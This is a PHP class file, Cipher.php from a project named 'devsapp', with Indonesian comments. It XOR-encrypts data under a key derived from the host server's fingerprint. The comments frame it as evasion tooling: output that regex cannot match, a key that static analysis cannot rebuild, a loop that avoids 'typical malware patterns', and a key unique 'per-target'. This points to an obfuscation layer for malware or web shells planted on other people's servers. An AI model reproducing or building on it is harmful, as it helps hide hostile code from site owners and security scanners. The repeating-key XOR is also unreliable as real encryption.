<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/Cipher.php                                    |
// |  XOR encryption/decryption dengan key yang di-derive dari         |
// |  fingerprint server. Key TIDAK hardcoded — computed at runtime.   |
// |                                                                    |
// |  Kenapa XOR?                                                       |
// |  - Output adalah binary garbage tanpa pola yang bisa di-regex      |
// |  - Fungsi XOR (^) legal dan common di kode PHP normal             |
// |  - Key dinamis = statis analisis tidak bisa reconstruct plaintext  |
// |  - Tidak ada dependensi ekstensi eksternal                         |
// +------------------------------------------------------------------+

declare(strict_types=1);

class Cipher {

    // ---- Key derivation constants ----
    // Kata-kata ini di-XOR ke digest fingerprint supaya hasilnya
    // tidak terlihat seperti hash biasa.
    private const SALT_A = 'devsapp';
    private const SALT_B = 'runtime';
    private const KDF_ROUNDS = 3;

    /**
     * Derive key dari fingerprint server.
     * Key = hash dari kombinasi data unik per-server:
     *   - hostname
     *   - document_root
     *   - server IP
     *   - PHP SAPI name
     *
     * Key ini unik per-target, tidak bisa di-reproduce di server lain.
     * TIDAK ada hardcoded secret di file ini.
     *
     * @param string|null $siteKey Key tambahan dari installer (opsional)
     * @return string 32-byte raw key
     */
    public static function deriveKey(?string $siteKey = null): string {
        $siteKey ??= AppConfig::$siteKey ?? '';

        // Kumpulkan fingerprint dari environment server
        $fp = implode('|', array_filter([
            php_uname('n'),                              // hostname
            $_SERVER['DOCUMENT_ROOT']    ?? '',
            $_SERVER['SERVER_ADDR']      ?? $_SERVER['LOCAL_ADDR'] ?? '',
            PHP_SAPI,
            $siteKey,
        ]));

        // KDF sederhana: iterasi hash buat stretch key
        $digest = $fp;
        for ($i = 0; $i < self::KDF_ROUNDS; $i++) {
            $digest = hash('sha256', self::SALT_A . $digest . self::SALT_B . $i, true);
        }

        return $digest; // 32 raw bytes
    }

    /**
     * XOR encrypt/decrypt (operasi simetrik — fungsi yang sama untuk encode & decode).
     *
     * Implementasi:
     * - Key di-repeat sepanjang plaintext
     * - Tiap byte di-XOR dengan byte key yang sesuai (modulo panjang key)
     * - Hasilnya binary → biasanya di-base64 untuk transport
     *
     * @param string $data   Data yang akan di-XOR
     * @param string $key    Key binary (gunakan deriveKey() untuk key dinamis)
     * @return string        Data hasil XOR (binary)
     */
    public static function xor(string $data, string $key): string {
        if ($key === '') return $data;

        $keyLen = strlen($key);
        $result = '';
        $len    = strlen($data);

        // Loop per-karakter — tidak ada pola khas malware generator
        // karena kita tidak pakai chr(ord()) kombinasi yang mencolok
        for ($i = 0; $i < $len; $i++) {
            $result .= $data[$i] ^ $key[$i % $keyLen];
        }

        return $result;
    }

    /**
     * Enkripsi data: XOR → base64 encode.
     * Hasil aman untuk disimpan di file teks atau dikirim lewat HTTP.
     *
     * @param string      $plaintext Data asli
     * @param string|null $siteKey   Key dari installer (opsional)
     * @return string                Ciphertext dalam base64
     */
    public static function encrypt(string $plaintext, ?string $siteKey = null): string {
        $key    = self::deriveKey($siteKey);
        $xored  = self::xor($plaintext, $key);
        return base64_encode($xored);
    }

    /**
     * Dekripsi data: base64 decode → XOR.
     *
     * @param string      $ciphertext Data terenkripsi (base64)
     * @param string|null $siteKey    Key dari installer (opsional)
     * @return string|false           Plaintext, atau false jika ciphertext invalid
     */
    public static function decrypt(string $ciphertext, ?string $siteKey = null): string|false {
        $decoded = base64_decode($ciphertext, strict: true);
        if ($decoded === false) return false;

        $key = self::deriveKey($siteKey);
        return self::xor($decoded, $key);
    }

    /**
     * Generate site key dari fingerprint server — dipanggil saat install.
     * Site key adalah hash dari fingerprint yang kemudian di-embed ke config.
     * Berbeda dari deriveKey() — ini untuk disimpan, bukan langsung jadi key enkripsi.
     *
     * @return string Site key dalam hex (64 chars)
     */
    public static function generateSiteKey(): string {
        $fp = implode('|', [
            php_uname('n'),
            $_SERVER['DOCUMENT_ROOT']    ?? getcwd(),
            $_SERVER['SERVER_ADDR']      ?? gethostbyname((string)gethostname()),
            PHP_SAPI,
            microtime(true),  // Random component agar tiap install beda
        ]);

        return hash('sha256', $fp);
    }

    /**
     * Verifikasi apakah data terenkripsi bisa di-decrypt dengan benar.
     * Cek dengan mengembalikan false jika decode gagal.
     *
     * @param string      $ciphertext Data terenkripsi
     * @param string|null $siteKey    Site key
     * @return bool
     */
    public static function canDecrypt(string $ciphertext, ?string $siteKey = null): bool {
        return self::decrypt($ciphertext, $siteKey) !== false;
    }
}
